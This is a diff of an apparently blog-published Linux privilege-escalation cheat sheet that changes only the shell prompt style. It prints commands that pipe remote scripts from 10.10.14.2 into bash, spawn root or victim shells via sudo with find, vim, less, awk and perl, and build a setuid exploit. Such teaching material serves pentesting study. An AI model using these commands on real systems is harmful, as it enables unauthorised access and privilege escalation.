@@ -270,8 +270,8 @@
 <p>On the target&rsquo;s machine we can do:</p>
 </li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl 10.10.14.2/linpeas.sh | bash
-$ curl 10.10.14.2/LinEnum.sh | bash
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$&gt; curl 10.10.14.2/linpeas.sh | bash
+$&gt; curl 10.10.14.2/LinEnum.sh | bash
 </code></pre></div><hr>
 <h2 id="nano-privilege-escalation">Nano privilege escalation</h2>
 <ul>
@@ -296,13 +296,13 @@ reset; sh 1&gt;&amp;<span style="color:#ae81ff">0</span> 2&gt;&amp;<span style="
 <hr>
 <h2 id="sudo-privilege-escalation">Sudo privilege escalation</h2>
 <h3 id="listing-allowed-sudo-commands">Listing allowed <code>sudo</code> commands</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo -l
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$&gt; sudo -l
 </code></pre></div><h3 id="impersonating-with-sudo">Impersonating with <code>sudo</code></h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo -u victim command
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$&gt; sudo -u victim command
 </code></pre></div><h3 id="escalating-privileges-with-find-command">Escalating privileges with <code>find</code> command</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo -u victim /usr/bin/find -exec /bin/bash <span style="color:#ae81ff">\;</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$&gt; sudo -u victim /usr/bin/find -exec /bin/bash <span style="color:#ae81ff">\;</span>
 </code></pre></div><h3 id="escalating-privileges-with-vim-editor">Escalating privileges with <code>vim</code> editor</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo -u victim /usr/bin/vim
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$&gt; sudo -u victim /usr/bin/vim
 
 <span style="color:#75715e"># Inside the vim we can call a shell</span>
 :!/bin/bash
@@ -310,17 +310,17 @@ reset; sh 1&gt;&amp;<span style="color:#ae81ff">0</span> 2&gt;&amp;<span style="
 <ul>
 <li>Open a file using less</li>
 </ul>
-<pre><code>$ sudo -u victim less /home/victim/key.txt
+<pre><code>$&gt; sudo -u victim less /home/victim/key.txt
 </code></pre><ul>
 <li>Inside the less we can call a shell</li>
 </ul>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">!/bin/bash
 </code></pre></div><h3 id="escalating-privileges-with-awk-command">Escalating privileges with <code>awk</code> command</h3>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Reading files with awk</span>
-$ sudo -u victim /usr/bin/awk <span style="color:#e6db74">&#39;{print $1}&#39;</span> /home/victim/key.txt
+$&gt; sudo -u victim /usr/bin/awk <span style="color:#e6db74">&#39;{print $1}&#39;</span> /home/victim/key.txt
 
 <span style="color:#75715e"># Executing command within awk</span>
-$ sudo -u victim /usr/bin/awk <span style="color:#e6db74">&#39;BEGIN {system(&#34;/bin/bash&#34;)}&#39;</span>
+$&gt; sudo -u victim /usr/bin/awk <span style="color:#e6db74">&#39;BEGIN {system(&#34;/bin/bash&#34;)}&#39;</span>
 </code></pre></div><h3 id="escalating-privileges-with-chmod">Escalating privileges with <code>chmod</code></h3>
 <ul>
 <li>Create the exploit to call a command</li>
@@ -334,16 +334,16 @@ int main<span style="color:#f92672">(</span>void<span style="color:#f92672">)</s
 </code></pre></div><ul>
 <li>Compiling the exploit</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cd /tmp
-$ gcc exploit.c -o exploit
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$&gt; cd /tmp
+$&gt; gcc exploit.c -o exploit
 </code></pre></div><ul>
 <li>Setting the <strong>setuid</strong> and <strong>setgid</strong> flags</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo -u victim cp exploit exploit2
-$ sudo -u victim chmod +xs exploit2
-$ ./exploit2
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$&gt; sudo -u victim cp exploit exploit2
+$&gt; sudo -u victim chmod +xs exploit2
+$&gt; ./exploit2
 </code></pre></div><h3 id="escalating-privileges-with-perl">Escalating privileges with <code>perl</code></h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo -u victim perl -e <span style="color:#e6db74">&#39;exec &#34;/bin/bash&#34;;&#39;</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$&gt; sudo -u victim perl -e <span style="color:#e6db74">&#39;exec &#34;/bin/bash&#34;;&#39;</span>
 </code></pre></div>
   </div>
   
